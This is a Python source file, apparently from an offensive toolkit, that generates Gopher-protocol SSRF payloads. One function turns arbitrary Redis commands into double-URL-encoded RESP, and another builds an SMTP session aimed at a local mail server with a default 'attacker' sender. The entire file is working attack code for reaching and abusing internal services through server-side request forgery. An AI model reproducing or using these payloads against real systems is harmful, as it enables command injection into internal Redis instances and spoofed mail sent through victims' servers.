"""
Gopher Payload Generator

Gopherプロトコルを使用したSSRF攻撃用ペイロードを生成する。
Redis, SMTP, FastCGI等への攻撃をサポート。
"""

from urllib.parse import quote

class GopherTool:
    
    def generate_redis_payload(self, host: str, port: int, commands: list[str]) -> str:
        """
        Redis攻撃用Gopherペイロード生成
        RESP (Redis Serialization Protocol) に変換してURLエンコード
        """
        payload = ""
        for cmd in commands:
            parts = cmd.split()
            payload += f"*{len(parts)}\r\n"
            for part in parts:
                payload += f"${len(part)}\r\n{part}\r\n"
        
        # URL encode for gopher (double encode often needed)
        encoded_payload = quote(quote(payload))
        return f"gopher://{host}:{port}/_{encoded_payload}"

    def generate_smtp_payload(self, to: str, subject: str, body: str, from_addr: str = "attacker@example.com") -> str:
        """
        SMTP攻撃用Gopherペイロード生成
        """
        commands = [
            f"MAIL FROM:{from_addr}",
            f"RCPT TO:{to}",
            "DATA",
            f"Subject: {subject}",
            "",
            body,
            ".",
            "QUIT"
        ]
        
        payload = "\r\n".join(commands)
        encoded_payload = quote(quote(payload))
        return f"gopher://127.0.0.1:25/_{encoded_payload}"
